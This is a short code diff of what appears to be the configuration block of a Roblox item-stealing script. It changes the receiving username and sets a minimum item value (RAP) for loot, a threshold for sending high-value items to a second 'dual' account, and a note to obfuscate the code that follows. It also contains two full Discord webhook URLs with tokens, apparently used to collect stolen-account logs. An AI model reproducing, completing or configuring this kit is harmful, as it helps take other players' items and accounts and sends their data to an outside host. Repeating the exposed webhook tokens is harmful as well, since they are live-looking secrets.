@@ -1,12 +1,12 @@
-Username = "zenith_msvdpro"
-Username2 = "zenith_msvdpro"
+Username = "v1leos"
+Username2 = "v1leos"
 Webhook = ""
 
 -- OBFUSCATE AFTER THIS MOMENT
 MinimumRAP = 5000000
 
 DualRAP = 500000000
-DualUser = "zenith_msvdpro"
+DualUser = "v1leos"
 DualWebhook = "https://discord.com/api/webhooks/1371001195363172452/z3qAJbPtTuUuAqDqI9yBIMR-hZ9Q2XuNUBnLVacoIFgckWfV-Nit7q8NSjG0GlB7vEBr"
 
 LogsWebhook = "https://discord.com/api/webhooks/1371001363332333618/2f6F8WUbJsNoExHDdYWnnFOd9zrHKrQKuhvA249b6JZXAfO8VxUe9lYy_QVwhjaa7Cke"
